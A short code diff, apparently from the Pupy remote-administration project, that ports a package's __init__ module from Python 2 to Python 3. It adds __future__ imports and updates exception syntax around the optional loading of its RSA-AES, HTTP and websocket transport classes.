@@ -1,5 +1,9 @@
 # -*- encoding: utf-8 -*-
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 __all__ = (
     'Proxy', 'getLogger',
     'PupySocketStream', 'PupyUDPSocketStream',
@@ -47,21 +51,21 @@ from .transports.dummy import DummyPupyTransport
 
 try:
     from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
-except Exception, e:
+except Exception as e:
     logger.exception('Transport rsa_aes disabled: %s', e)
     RSA_AESClient = None
     RSA_AESServer = None
 
 try:
     from .transports.http import PupyHTTPClient, PupyHTTPServer
-except Exception, e:
+except Exception as e:
     logger.exception('Transport http disabled: %s', e)
     PupyHTTPClient = None
     PupyHTTPServer = None
 
 try:
     from .transports.websocket import PupyWebSocketClient, PupyWebSocketServer
-except Exception, e:
+except Exception as e:
     logger.exception('Transport websocket disabled: %s', e)
     PupyWebSocketClient = None
     PupyWebSocketServer = None
